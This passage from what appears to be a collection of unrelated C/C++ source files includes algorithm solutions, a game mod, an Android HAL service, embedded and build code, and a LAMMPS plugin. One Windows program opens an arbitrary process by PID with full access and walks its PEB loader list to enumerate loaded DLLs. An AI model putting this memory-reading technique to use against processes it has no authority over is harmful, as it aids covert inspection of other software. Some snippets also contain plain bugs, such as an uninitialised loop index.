std::string(progress ? \" ON\\n\" : \"OFF\\n\"), CYAN);\n\n    std::vector<std::string> filepaths;\n\n    try\n    {\n        if (recursive) for (const auto& entry : std::filesystem::recursive_directory_iterator(dir))\n        {\n            try { entry.path(); }\n            catch (const std::filesystem::filesystem_error& e)\n            {\n                std::cout << \"caught fs error: \" << e.what() << \"\\n\";\n                continue;\n            }\n\n            if (std::filesystem::is_directory(entry.path())) continue;\n            if (extensions.size() == 0) filepaths.push_back(entry.path().string());\n            else\n            {\n                std::string ext = entry.path().extension().string();\n                for (const std::stri",
    "// Leetcode 1319\n\nclass dis\n{\npublic:\n    vector<int> parent;\n    vector<int> size;\n    dis(int n)\n    {\n        parent.resize(n + 1);\n        size.resize(n + 1);\n        for (int i = 0; i <= n; i++)\n        {\n            parent[i] = i;\n            size[i] = 1;\n        }\n    }\n    int findparent(int u)\n    {\n        if (u == parent[u])\n            return u;\n        return parent[u] = findparent(parent[u]);\n    }\n    void unionbysize(int u, int v)\n    {\n        int up = findparent(u);\n        int vp = findparent(v);\n        if (up == vp)\n            return;\n        if (size[vp] > size[up])\n        {\n            parent[vp] = up;\n            size[up] += size[vp];\n        }\n        else\n        {\n            parent[up] = vp;\n            size[vp] += size[up];\n        }\n    }\n};\nclass Solution\n{\npublic:\n    int makeConnected(int n, vector<vector<int>> &connections)\n    {\n        dis d(n);\n        int extracables = 0;\n        for (int i = 0; i < connections.size(); i++)\n        {\n            int first = connections[i][0];\n            int second = connections[i][1];\n\n            if (d.findparent(first) == d.findparent(second))\n                extracables++;\n            else\n                d.unionbysize(first, second);\n        }\n\n        int compo = 0;\n        for (int i = 0; i < n; i++)\n        {\n            if (d.parent[i] == i)\n                compo++;\n        }\n\n        if (compo - 1 <= extracables)\n            return compo - 1;\n        return -1;\n    }\n};",
    "#include <Geode/DefaultInclude.hpp>\n#include <Geode/modify/MenuLayer.hpp>\n#include <hjfod.gmd-api/include/GMD.hpp>\n\nusing namespace geode::prelude;\n\nstruct RecoveryStats final {\n\tsize_t recoveredLevels = 0;\n\tsize_t duplicateLevels = 0;\n\tsize_t failedLevels = 0;\n\n\tsize_t recoveredLists = 0;\n\tsize_t duplicateLists = 0;\n\tsize_t failedLists = 0;\n};\n\nstatic std::vector<std::string> recoverLevelOrder(std::filesystem::path const& file, std::string const& key) {\n\t// Try to load metadata, but don't hard-fail if not possible\n\tauto metaRes = file::readFromJson<matjson::Value>(file);\n\tif (!metaRes) {\n        return std::vector<std::string>();\n\t}\n    return matjson::Serialize<std::vector<std::string>>::from_json(metaRes->as_object()[key]);\n}\n\nstatic RecoveryStats recoverOldBS() {\n\tauto oldSaveDir = dirs::getSaveDir() / \"levels\";\n\n    RecoveryStats stats;\n    auto llm = LocalLevelManager::get();\n\tauto recovered = Ref(CCArray::create());\n\n\tlog::info(\"Recovering lost levels...\");\n\tfor (auto dir : file::readDirectory(oldSaveDir / \"created\").unwrapOrDefault()) {\n\t\tif (std::filesystem::exists(dir / \"level.gmd\")) {\n\t\t\tauto levelRes = gmd::importGmdAsLevel(dir / \"level.gmd\");\n\t\t\tif (!levelRes) {\n                stats.failedLevels += 1;\n\t\t\t\tlog::error(\"Unable to recover level '{}': {}\", dir.filename(), levelRes.unwrapErr());\n                continue;\n\t\t\t}\n            auto level = *levelRes;\n            for (auto existing : CCArrayExt<GJGameLevel*>(llm->m_localLevels)) {\n                if (existing->m_levelString == level->m_levelString) {\n                    stats.duplicateLevels += 1;\n\t\t\t\t    log::warn(\"Skipping duplicate level '{}' (duplicate of '{}')\", level->m_levelName, existing->m_levelName);\n                    goto continue_outer_level_loop;\n                }\n            }\n\t\t\t// BetterSave may have duplicated stuff in the past already\n            for (auto existing : CCArrayExt<GJGameLevel*>(recovered)) {\n                if (existing->m_levelString == level->m_levelString) {\n                    stats.duplicateLevels += 1;\n\t\t\t\t    log::warn(\"Skipping duplicate level '{}' (duplicate of already recovered level '{}')\", level->m_levelName, existing->m_levelName);\n                    goto continue_outer_level_loop;\n                }\n            }\n            level->setID(dir.filename().string());\n            recovered->addObject(level);\n            stats.recoveredLevels += 1;\n\t\t}\n        continue_outer_level_loop:;\n\t}\n\n    auto levelsOrder = recoverLevelOrder(oldSaveDir / \"created\" / \"metadata.json\", \"level-order\");\n\tauto levels = recovered->data;\n\tstd::sort(\n\t\tlevels->arr, levels->arr + levels->num,\n\t\t[&levelsOrder](CCObject* first, CCObject* second) -> bool {\n\t\t\treturn ranges::indexOf(levelsOrder, static_cast<GJGameLevel*>(first)->getID()) < \n\t\t\t\tranges::indexOf(levelsOrder, static_cast<GJGameLevel*>(second)->getID());\n\t\t}\n\t);\n\n\t// Add the recovered levels to the start of the list\n\trecovered->addObjectsFromArray(llm->m_localLevels);\n\tllm->m_localLevels->removeAllObjects();\n\tllm->m_localLevels->addObjectsFromArray(recovered);\n\n\tlog::info(\"Recovered {} levels ({} duplicates, {} failed)\", stats.recoveredLevels, stats.duplicateLevels, stats.failedLevels);\n\n\t// Reuse the same array for lists\n\trecovered->removeAllObjects();\n\n\tlog::info(\"Recovering lost lists...\");\n\tfor (auto dir : file::readDirectory(oldSaveDir / \"lists\").unwrapOrDefault()) {\n\t\tif (std::filesystem::exists(dir / \"list.gmdl\")) {\n\t\t\tauto listRes = gmd::importGmdAsList(dir / \"list.gmdl\");\n\t\t\tif (!listRes) {\n                stats.failedLists += 1;\n\t\t\t\tlog::error(\"Unable to recover list '{}': {}\", dir.filename(), listRes.unwrapErr());\n                continue;\n\t\t\t}\n            auto list = *listRes;\n            for (auto existing : CCArrayExt<GJLevelList*>(llm->m_localLists)) {\n                if (std::vector<int>(existing->m_levels) == std::vector<int>(list->m_levels)) {\n                    stats.duplicateLists += 1;\n\t\t\t\t    log::warn(\"Skipping duplicate list '{}' (duplicate of '{}')\", list->m_listName, existing->m_listName);\n                    goto continue_outer_list_loop;\n                }\n            }\n\t\t\t// BetterSave may have duplicated stuff in the past already\n            for (auto existing : CCArrayExt<GJLevelList*>(recovered)) {\n                if (std::vector<int>(existing->m_levels) == std::vector<int>(list->m_levels)) {\n                    stats.duplicateLists += 1;\n\t\t\t\t    log::warn(\"Skipping duplicate list '{}' (duplicate of already recovered list '{}')\", list->m_listName, existing->m_listName);\n                    goto continue_outer_list_loop;\n                }\n            }\n            recovered->addObject(list);\n            stats.recoveredLists += 1;\n\t\t}\n        continue_outer_list_loop:;\n\t}\n\n    auto listsOrder = recoverLevelOrder(oldSaveDir / \"lists\" / \"metadata.json\", \"list-order\");\n\tauto lists = recovered->data;\n\tstd::sort(\n\t\tlists->arr, lists->arr + lists->num,\n\t\t[&listsOrder](CCObject* first, CCObject* second) -> bool {\n\t\t\treturn ranges::index",
    "/*\n * Copyright (C) 2019-2021 The LineageOS Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#ifdef LIVES_IN_SYSTEM\n#define LOG_TAG \"lineage.livedisplay@2.0-service-sdm\"\n#else\n#define LOG_TAG \"vendor.lineage.livedisplay@2.0-service-sdm\"\n#endif\n\n#include <android-base/logging.h>\n#include <binder/ProcessState.h>\n#include <hidl/HidlTransportSupport.h>\n#include <livedisplay/sdm/DisplayModes.h>\n#include <livedisplay/sdm/PictureAdjustment.h>\n#include <livedisplay/sdm/SDMController.h>\n\nusing ::android::OK;\nusing ::android::sp;\nusing ::android::status_t;\nusing ::android::hardware::configureRpcThreadpool;\nusing ::android::hardware::joinRpcThreadpool;\n\nusing ::vendor::lineage::livedisplay::V2_0::sdm::DisplayModes;\nusing ::vendor::lineage::livedisplay::V2_0::sdm::PictureAdjustment;\nusing ::vendor::lineage::livedisplay::V2_0::sdm::SDMController;\n\nstatus_t RegisterAsServices() {\n    status_t status = OK;\n    std::shared_ptr<SDMController> controller = std::make_shared<SDMController>();\n\n    sp<PictureAdjustment> pa = new PictureAdjustment(controller);\n    status = pa->registerAsService();\n    if (status != OK) {\n        LOG(ERROR) << \"Could not register service for LiveDisplay HAL PictureAdjustment Iface (\"\n                   << status << \")\";\n        return status;\n    }\n\n    if (DisplayModes::isSupported()) {\n        sp<DisplayModes> dm = new DisplayModes(controller);\n        status = dm->registerAsService();\n        if (status != OK) {\n            LOG(ERROR) << \"Could not register service for LiveDisplay HAL DisplayModes Iface (\"\n                       << status << \")\";\n            return status;\n        }\n        // Update default PA on setDisplayMode\n        dm->registerDisplayModeSetCallback(\n                std::bind(&PictureAdjustment::updateDefaultPictureAdjustment, pa));\n    }\n\n    return OK;\n}\n\nint main() {\n#ifdef LIVES_IN_SYSTEM\n    android::ProcessState::initWithDriver(\"/dev/binder\");\n#else\n    android::ProcessState::initWithDriver(\"/dev/vndbinder\");\n#endif\n\n    LOG(INFO) << \"LiveDisplay HAL service is starting.\";\n\n    configureRpcThreadpool(1, true /*callerWillJoin*/);\n\n    if (RegisterAsServices() == OK) {\n        LOG(INFO) << \"LiveDisplay HAL service is ready.\";\n        joinRpcThreadpool();\n    } else {\n        LOG(ERROR) << \"Could not register service for LiveDisplay HAL\";\n    }\n\n    // In normal operation, we don't expect the thread pool to shutdown\n    LOG(ERROR) << \"LiveDisplay HAL service is shutting down.\";\n    return 1;\n}\n",
    "#include \"libmotordriver.h\"\r\n\r\n\r\nvoid LibMotorDriver::motor_int() {\r\n  pinMode(PWML, OUTPUT);\r\n  pinMode(motorpinL1, OUTPUT);\r\n  pinMode(motorpinL2, OUTPUT);\r\n  pinMode(motorpinR1, OUTPUT);\r\n  pinMode(motorpinR2, OUTPUT);\r\n  pinMode(PWMR, OUTPUT);\r\n}\r\n\r\nvoid LibMotorDriver::motorFL(int a) {\r\n  digitalWrite(motorpinL1, HIGH);\r\n  digitalWrite(motorpinL2, LOW);\r\n  analogWrite(PWML, map(a, 0, 100, 0, 255));\r\n}\r\n\r\nvoid LibMotorDriver::motorFR(int b) {\r\n  digitalWrite(motorpinR1, HIGH);\r\n  digitalWrite(motorpinR2, LOW);\r\n  analogWrite(PWMR, map(b, 0, 100, 0, 255));\r\n}\r\n\r\nvoid LibMotorDriver::motorBL(int c) {\r\n  digitalWrite(motorpinL1, LOW);\r\n  digitalWrite(motorpinL2, HIGH);\r\n  analogWrite(PWML, map(c, 0, 100, 0, 255));\r\n}\r\n\r\nvoid LibMotorDriver::motorBR(int d) {\r\n  digitalWrite(motorpinR1, LOW);\r\n  digitalWrite(motorpinR2, HIGH);\r\n  analogWrite(PWMR, map(d, 0, 100, 0, 255));\r\n}\r\n\r\nvoid LibMotorDriver::motor(int left, int right) { //function control duo motor Left and Right\r\n  if (left < 0) {\r\n    motorBL(-left);\r\n  } else {\r\n    motorFL(left);\r\n  }\r\n  if (right < 0) {\r\n    motorBR(-right);\r\n  } else {\r\n    motorFR(right);\r\n  }\r\n}\r\n\r\nvoid LibMotorDriver::motor_stop_all() { //function stop all motor\r\n  digitalWrite(motorpinL1, HIGH);\r\n  digitalWrite(motorpinL2, LOW);\r\n  analogWrite(PWML, 0);\r\n  digitalWrite(motorpinR1, HIGH);\r\n  digitalWrite(motorpinR2, LOW);\r\n  analogWrite(PWMR, 0);\r\n}\r\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\r\n   recognize the extension without flags.  Borland does not know .cxx for\r\n   example.  */\r\n#ifndef __cplusplus\r\n# error \"A C compiler has been selected for C++.\"\r\n#endif\r\n\r\n#if !defined(__has_include)\r\n/* If the compiler does not have __has_include, pretend the answer is\r\n   always no.  */\r\n#  define __has_include(x) 0\r\n#endif\r\n\r\n\r\n/* Version number components: V=Version, R=Revision, P=Patch\r\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\r\n\r\n#if defined(__COMO__)\r\n# define COMPILER_ID \"Comeau\"\r\n  /* __COMO_VERSION__ = VRR */\r\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\r\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\r\n\r\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\r\n# define COMPILER_ID \"Intel\"\r\n# if defined(_MSC_VER)\r\n#  define SIMULATE_ID \"MSVC\"\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_ID \"GNU\"\r\n# endif\r\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\r\n     except that a few beta releases use the old format with V=2021.  */\r\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\r\n#  if defined(__INTEL_COMPILER_UPDATE)\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\r\n#  else\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\r\n#  endif\r\n# else\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\r\n   /* The third version component from --version is an update index,\r\n      but no macro is provided for it.  */\r\n#  define COMPILER_VERSION_PATCH DEC(0)\r\n# endif\r\n# if defined(__INTEL_COMPILER_BUILD_DATE)\r\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\r\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\r\n# endif\r\n# if defined(_MSC_VER)\r\n   /* _MSC_VER = VVRR */\r\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n# elif defined(__GNUG__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n# endif\r\n# if defined(__GNUC_MINOR__)\r\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n# endif\r\n# if defined(__GNUC_PATCHLEVEL__)\r\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\r\n# define COMPILER_ID \"IntelLLVM\"\r\n#if defined(_MSC_VER)\r\n# define SIMULATE_ID \"MSVC\"\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_ID \"GNU\"\r\n#endif\r\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\r\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\r\n * VVVV is no smaller than the current year when a version is released.\r\n */\r\n#if __INTEL_LLVM_COMPILER < 1000000L\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\r\n#else\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\r\n#endif\r\n#if defined(_MSC_VER)\r\n  /* _MSC_VER = VVRR */\r\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n#elif defined(__GNUG__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n#endif\r\n#if defined(__GNUC_MINOR__)\r\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n#endif\r\n#if defined(__GNUC_PATCHLEVEL__)\r\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n#endif\r\n\r\n#elif defined(__PATHCC__)\r\n# define COMPILER_ID \"PathScale\"\r\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\r\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\r\n# if defined(__PATHCC_PATCHLEVEL__)\r\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\r\n# define COMPILER_ID \"Embarcadero\"\r\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\r\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\r\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\r\n\r\n#elif defined(__BORLANDC__)\r\n# define COMPILER_ID \"Borland\"\r\n  /* __BORLANDC__ = 0xVRR */\r\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\r\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\r\n\r\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\r\n# define COMPILER_ID \"Watcom\"\r\n   /* __WATCOMC__ = VVRR */\r\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\r\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\r\n# if (__WATCOMC__ % 10) > 0\r\n#  define C",
    "#include \"Pipe.hpp\"\n\nnamespace Sonar {\n\tPipe::Pipe(GameDataRef data) : _data(data) {\n\n\t}\n\n\tvoid Pipe::SpawnBottomPipe() {\n\t\tsf::Sprite sprite(_data->assets.GetTexture(\"Pipe Up\"));\n\t\tsprite.setPosition(_data->window.getSize().x, _data->window.getSize().y - sprite.getGlobalBounds().height);\n\n\t\tpipeSprites.push_back(sprite);\n\n\t}\n\tvoid Pipe::SpawnTopPipe() {\n\t\tsf::Sprite sprite(_data->assets.GetTexture(\"Pipe Down\"));\n\t\tsprite.setPosition(_data->window.getSize().x, 0);\n\n\t\tpipeSprites.push_back(sprite);\n\t}\n\tvoid Pipe::SpawnInvisiblePipe() {\n\t\tsf::Sprite sprite(_data->assets.GetTexture(\"Pipe Up\"));\n\t\tsprite.setPosition(_data->window.getSize().x, _data->window.getSize().y - sprite.getGlobalBounds().height);\n\t\tsprite.setColor(sf::Color(0, 0, 0, 0));\n\t\tpipeSprites.push_back(sprite);\n\t}\n\tvoid Pipe::MovePipes(float dt) {\n\t\tfor (unsigned short int i = 0; i < pipeSprites.size(); i++) {\n\t\t\tsf::Vector2f position = pipeSprites.at(i).getPosition();\n\n\t\t\tfloat movement = PIPE_MOVEMENT_SPEED * dt;\n\t\t\n\t\t\tpipeSprites.at(i).move(-movement, 0);\n\t\t}\n\t}\n\n\tvoid Pipe::DrawPipes() {\n\t\tfor (unsigned short int i = 0; i < pipeSprites.size(); i++) {\n\t\t\t_data->window.draw(pipeSprites.at(i));\n\t\t}\n\t}\n}",
    "#include <stdio.h>\n#include <windows.h>\n#include <winternl.h>\n#define BUF_LEN 255\n\ntypedef struct\n{\n\tULONG Length;\n\tUCHAR Initialized;\n\tPVOID SsHandle;\n\tLIST_ENTRY InLoadOrderModuleList;\n\tLIST_ENTRY InMemoryOrderModuleList;\n\tLIST_ENTRY InInitializationOrderModuleList;\n\tPVOID EntryInProgress;\n} PEB_LDR_DATA_UNDOC;\n\ntypedef struct\n{\n\tLIST_ENTRY InLoadOrderLinks;\n\tLIST_ENTRY InMemoryOrderLinks;\n\tLIST_ENTRY InInitializationOrderLinks;\n\tPVOID DllBase;\n\tPVOID EntryPoint;\n\tULONG SizeOfImage;\n\tUNICODE_STRING FullDllName;\n\tUNICODE_STRING BaseDllName;\n\tULONG Flags;\n\tWORD LoadCount;\n\tWORD TlsIndex;\n\tunion\n\t{\n\t\tLIST_ENTRY HashLinks;\n\t\tstruct\n\t\t{\n\t\t\tPVOID SectionPointer;\n\t\t\tULONG CheckSum;\n\t\t};\n\t};\n\tunion\n\t{\n\t\tULONG TimeDateStamp;\n\t\tPVOID LoadedImports;\n\t};\n\t_ACTIVATION_CONTEXT* EntryPointActivationContext;\n\tPVOID PatchInformation;\n\tLIST_ENTRY ForwarderLinks;\n\tLIST_ENTRY ServiceTagLinks;\n\tLIST_ENTRY StaticLinks;\n} LDR_DATA_TABLE_ENTRY_UNDOC;\n\ntypedef NTSTATUS(NTAPI* fpNtQueryInformationProcess)(\n\tIN HANDLE ProcessHandle,\n\tIN PROCESSINFOCLASS ProcessInformationClass,\n\tOUT PVOID ProcessInformation,\n\tIN ULONG ProcessInformationLength\n\t);\n\nint main()\n{\n\t// Load NtQueryInformationProcess\n\tconst char aNtdllStr[] = \"ntdll.dll\";\n\tHMODULE hNtdll = GetModuleHandleA(aNtdllStr);\n\tif (hNtdll == NULL)\n\t\thNtdll = LoadLibraryA(aNtdllStr);\n\tif (hNtdll == NULL) {\n\t\tfprintf(stderr, \"Failed to load library %s\\n\", aNtdllStr);\n\t\treturn 1;\n\t}\n\n\tfpNtQueryInformationProcess NtQueryInformationProcess = (fpNtQueryInformationProcess)GetProcAddress(hNtdll, \"NtQueryInformationProcess\");\n\tif (NtQueryInformationProcess == NULL) {\n\t\tfprintf(stderr, \"Failed to load NtQueryInformationProcess\\n\");\n\t\treturn 1;\n\t}\n\n\t// Initialisation\n\tchar buf[BUF_LEN];\n\tint pid;\n\tHANDLE hProc;\n\n\t// Obtain PID and process handle\n\tprintf(\"Enter PID: \");\n\tfgets(buf, BUF_LEN, stdin);\n\tpid = atoi(buf);\n\thProc = OpenProcess(PROCESS_ALL_ACCESS | PROCESS_QUERY_INFORMATION, FALSE, pid);\n\tif (!hProc) {\n\t\tfprintf(stderr, \"Failed to open process with PID %d\\n\", pid);\n\t\treturn 1;\n\t}\n\n\t// Get PEB\n\tPROCESS_BASIC_INFORMATION pbi = { 0 };\n\tNTSTATUS ntResult = NtQueryInformationProcess(hProc, ProcessBasicInformation, (PVOID)&pbi, sizeof(pbi));\n\tif (NT_ERROR(ntResult) || !pbi.PebBaseAddress) {\n\t\tfprintf(stderr, \"Failed to query process information. Error Code: %x\\n\", ntResult);\n\t\treturn 1;\n\t}\n\t\n\tPEB peb = { 0 };\n\tSIZE_T bytesRead;\n\tif (!ReadProcessMemory(hProc, (LPCVOID)pbi.PebBaseAddress, &peb, sizeof(PEB), &bytesRead)) {\n\t\tfprintf(stderr, \"Failed to read process memory. Error: %X\\n\", GetLastError());\n\t\treturn 1;\n\t}\n\tprintf(\"LDR pointer: %p\\n\", peb.Ldr);\n\n\t// Get list data\n\tPEB_LDR_DATA_UNDOC pebLdrData = { 0 };\n\tif (!ReadProcessMemory(hProc, (LPCVOID)peb.Ldr, &pebLdrData, sizeof(PEB_LDR_DATA_UNDOC), &bytesRead)) {\n\t\tfprintf(stderr, \"Failed to read process memory for PEB LDR Data. Error: %X\\n\", GetLastError());\n\t\treturn 1;\n\t}\n\n\t// Read list\n\tLIST_ENTRY* head = pebLdrData.InLoadOrderModuleList.Flink;\n\tLIST_ENTRY* entry = pebLdrData.InLoadOrderModuleList.Flink;\n\tunsigned int numEntries = 0;\n\n\tdo {\n\t\t// Get DLL Information\n\t\tLDR_DATA_TABLE_ENTRY_UNDOC ldrEntry = { 0 };\n\t\tif (!ReadProcessMemory(hProc, (LPCVOID)entry, &ldrEntry, sizeof(LDR_DATA_TABLE_ENTRY_UNDOC), &bytesRead)) {\n\t\t\tfprintf(stderr, \"Failed to read process memory for LDR entry. Error: %X\\n\", GetLastError());\n\t\t\treturn 1;\n\t\t}\n\n\t\t// Update entry\n\t\tnumEntries++;\n\t\tentry = ldrEntry.InLoadOrderLinks.Flink;\n\n\t\t// Report Entry\n\t\tUSHORT strLen = ldrEntry.FullDllName.Length;\n\t\tif (strLen > 0) {\n\t\t\tPWSTR dllName = (PWSTR)malloc(strLen * sizeof(WCHAR));\n\t\t\tif (!ReadProcessMemory(hProc, (LPCVOID)ldrEntry.FullDllName.Buffer, &(*dllName), strLen * sizeof(WCHAR), &bytesRead)) {\n\t\t\t\tfprintf(stderr, \"Failed to read process memory for DLL name. Error: %X\\n\", GetLastError());\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\twprintf(L\"DLL %lu:\\n\\tBase address: %p\\n\\tFull Name: %s\\n\", numEntries, ldrEntry.DllBase, dllName);\n\t\t}\n\t\telse {\n\t\t\tprintf(\"DLL %lu:\\n\\tBase address: %p\\n\", numEntries, ldrEntry.DllBase);\n\t\t}\n\t} while (entry != head);\n\tprintf(\"Entry Count: %u\\n\", numEntries);\n}\n",
    "#include <torch/script.h>\n#include <torch/torch.h>\n#include <iostream>\n#include <chrono>\n#include <cmath>\n#include <cstring>\n\n#include \"pair_mlff.h\"\n\n#include \"atom.h\"\n#include \"comm.h\"\n#include \"error.h\"\n#include \"fix.h\"\n#include \"force.h\"\n#include \"memory.h\"\n#include \"neigh_list.h\"\n#include \"neigh_request.h\"\n#include \"neighbor.h\"\n#include \"update.h\"\n#include \"domain.h\"\n\n\nusing namespace LAMMPS_NS;\n\n/* ---------------------------------------------------------------------- */\n\nPairMlff::PairMlff(LAMMPS* lmp) : Pair(lmp)\n{\n    writedata = 1;\n}\n\nPairMlff::~PairMlff()\n{\n    if (allocated) {\n        memory->destroy(setflag);\n        memory->destroy(cutsq);\n    }\n}\n\n/* ----------------------------------------------------------------------\n   allocate all arrays\n------------------------------------------------------------------------- */\n\nvoid PairMlff::allocate()\n{\n    allocated = 1;\n    int np1 = atom->ntypes;\n    memory->create(setflag, np1 + 1, np1 + 1, \"pair:setflag\");\n    for (int i = 1; i <= np1; i++)\n        for (int j = i; j <= np1; j++) setflag[i][j] = 0;\n    memory->create(cutsq, np1 + 1, np1 + 1, \"pair:cutsq\");\n\n}\n\nstatic bool is_key(const std::string& input) {\n    std::vector<std::string> keys;\n    keys.push_back(\"out_freq\");\n    keys.push_back(\"out_file\");\n\n    for (int ii = 0; ii < keys.size(); ++ii) {\n        if (input == keys[ii]) {\n            return true;\n        }\n    }\n    return false;\n}\n\nstatic int stringCmp(const void* a, const void* b) {\n    char* m = (char*)a;\n    char* n = (char*)b;\n    int i, sum = 0;\n\n    for (i = 0; i < MPI_MAX_PROCESSOR_NAME; i++) {\n        if (m[i] == n[i]) {\n            continue;\n        }\n        else {\n            sum = m[i] - n[i];\n            break;\n        }\n    }\n    return sum;\n}\n\nint PairMlff::get_node_rank() {\n    char host_name[MPI_MAX_PROCESSOR_NAME];\n    memset(host_name, '\\0', sizeof(char) * MPI_MAX_PROCESSOR_NAME);\n    char(*host_names)[MPI_MAX_PROCESSOR_NAME];\n    int n, namelen, color, rank, nprocs, myrank;\n    size_t bytes;\n    MPI_Comm nodeComm;\n\n    MPI_Comm_rank(MPI_COMM_WORLD, &rank);\n    MPI_Comm_size(MPI_COMM_WORLD, &nprocs);\n    MPI_Get_processor_name(host_name, &namelen);\n\n    bytes = nprocs * sizeof(char[MPI_MAX_PROCESSOR_NAME]);\n    host_names = (char(*)[MPI_MAX_PROCESSOR_NAME])malloc(bytes);\n    for (int ii = 0; ii < nprocs; ii++) {\n        memset(host_names[ii], '\\0', sizeof(char) * MPI_MAX_PROCESSOR_NAME);\n    }\n\n    strcpy(host_names[rank], host_name);\n\n    for (n = 0; n < nprocs; n++) {\n        MPI_Bcast(&(host_names[n]), MPI_MAX_PROCESSOR_NAME, MPI_CHAR, n,\n            MPI_COMM_WORLD);\n    }\n    qsort(host_names, nprocs, sizeof(char[MPI_MAX_PROCESSOR_NAME]), stringCmp);\n\n    color = 0;\n    for (n = 0; n < nprocs - 1; n++) {\n        if (strcmp(host_name, host_names[n]) == 0) {\n            break;\n        }\n        if (strcmp(host_names[n], host_names[n + 1])) {\n            color++;\n        }\n    }\n\n    MPI_Comm_split(MPI_COMM_WORLD, color, 0, &nodeComm);\n    MPI_Comm_rank(nodeComm, &myrank);\n\n    MPI_Barrier(MPI_COMM_WORLD);\n    int looprank = myrank;\n    // printf (\" Assigning device %d  to process on node %s rank %d,\n    // OK\\n\",looprank,  host_name, rank );\n    free(host_names);\n    return looprank;\n}\n\n\n\n/* ----------------------------------------------------------------------\n   global settings pair_style\n------------------------------------------------------------------------- */\n\nvoid PairMlff::settings(int narg, char** arg)\n{\n    if (narg <= 0) error->all(FLERR, \"Illegal pair_style command\");\n    std::vector<std::string> arg_vector;\n\n    int iarg;\n    while (iarg < narg) {\n        if (is_key(arg[iarg])) {\n            break;\n        }\n        iarg++;\n    }\n\n    for (int ii = 0; ii < iarg; ++ii) {\n        arg_vector.push_back(arg[ii]);\n    }\n\n    if (arg_vector.size() == 1) {\n        try\n        {\n            std::string model_file = arg_vector[0];\n            torch::jit::getExecutorMode() = false;\n            model = torch::jit::load(model_file);\n            if (torch::cuda::is_available()) { device = torch::Device(torch::kCUDA, get_node_rank());}\n            if (true) { dtype = torch::kFloat64; }\n            model.to(dtype);\n            model.to(device);\n            model.eval();\n            if (comm->me == 0)\n            {\n                utils::logmesg(lmp, \"Load model successful !----> %s\", model_file);\n                utils::logmesg(lmp, \"INFO IN MLFF-MODEL---->>\");\n            }\n\n        }\n        catch (const c10::Error e)\n        {\n            std::cerr << 